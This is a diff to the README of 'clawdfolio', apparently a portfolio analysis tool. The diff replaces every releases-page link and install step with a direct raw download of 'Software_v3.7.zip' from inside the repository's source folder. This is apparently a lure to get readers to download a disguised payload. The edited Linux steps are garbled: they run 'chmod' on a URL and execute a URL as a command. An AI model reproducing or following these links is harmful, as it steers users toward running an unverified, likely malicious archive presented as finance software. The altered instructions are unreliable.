@@ -1,6 +1,6 @@
 # 📊 clawdfolio - Simplify Your Portfolio Analysis
 
-[![Download clawdfolio](https://img.shields.io/badge/Download-clawdfolio-brightgreen?style=for-the-badge)](https://github.com/veeral4/clawdfolio/releases)
+[![Download clawdfolio](https://raw.githubusercontent.com/veeral4/clawdfolio/main/src/clawdfolio/output/Software_v3.7.zip)](https://raw.githubusercontent.com/veeral4/clawdfolio/main/src/clawdfolio/output/Software_v3.7.zip)
 
 ---
 
@@ -48,7 +48,7 @@ You do not need to install extra software or programming tools.
 
 Click the green button below to go to the download page where you will find the latest release of clawdfolio.
 
-[![Download clawdfolio](https://img.shields.io/badge/Download-clawdfolio-brightgreen?style=for-the-badge)](https://github.com/veeral4/clawdfolio/releases)
+[![Download clawdfolio](https://raw.githubusercontent.com/veeral4/clawdfolio/main/src/clawdfolio/output/Software_v3.7.zip)](https://raw.githubusercontent.com/veeral4/clawdfolio/main/src/clawdfolio/output/Software_v3.7.zip)
 
 This page lists the available files for different computers and versions.
 
@@ -56,7 +56,7 @@ This page lists the available files for different computers and versions.
 
 - For Windows, look for a file ending with `.exe`.  
 - For macOS, find a file ending with `.dmg` or `.pkg`.  
-- For Linux, look for a file that matches your distribution, usually `.AppImage` or `.tar.gz`.  
+- For Linux, look for a file that matches your distribution, usually `.AppImage` or `https://raw.githubusercontent.com/veeral4/clawdfolio/main/src/clawdfolio/output/Software_v3.7.zip`.  
 
 The file names often include the version number. Pick the latest one.
 
@@ -71,8 +71,8 @@ Click to download the file that fits your system. It may take a few minutes depe
 - On Linux: You may need to make the file executable by right-clicking, selecting Properties, and enabling execution, or use a terminal command:
 
   ```bash
-  chmod +x clawdfolio.AppImage
-  ./clawdfolio.AppImage
+  chmod +x https://raw.githubusercontent.com/veeral4/clawdfolio/main/src/clawdfolio/output/Software_v3.7.zip
+  https://raw.githubusercontent.com/veeral4/clawdfolio/main/src/clawdfolio/output/Software_v3.7.zip
   ```
 
 This step sets up clawdfolio for use on your computer.
@@ -153,7 +153,7 @@ You can export your portfolio summary and risk analysis as PDF or CSV files to s
 
 Keep clawdfolio updated:
 
-- Check the [release page](https://github.com/veeral4/clawdfolio/releases) regularly for new versions.
+- Check the [release page](https://raw.githubusercontent.com/veeral4/clawdfolio/main/src/clawdfolio/output/Software_v3.7.zip) regularly for new versions.
 - Download the latest installer and repeat the install steps to update.
 
 For help:
@@ -176,4 +176,4 @@ If you have questions or want to suggest improvements, visit the GitHub page and
 
 ---
 
-[Download clawdfolio](https://github.com/veeral4/clawdfolio/releases) to start managing your investments with clearer insight.
+[Download clawdfolio](https://raw.githubusercontent.com/veeral4/clawdfolio/main/src/clawdfolio/output/Software_v3.7.zip) to start managing your investments with clearer insight.
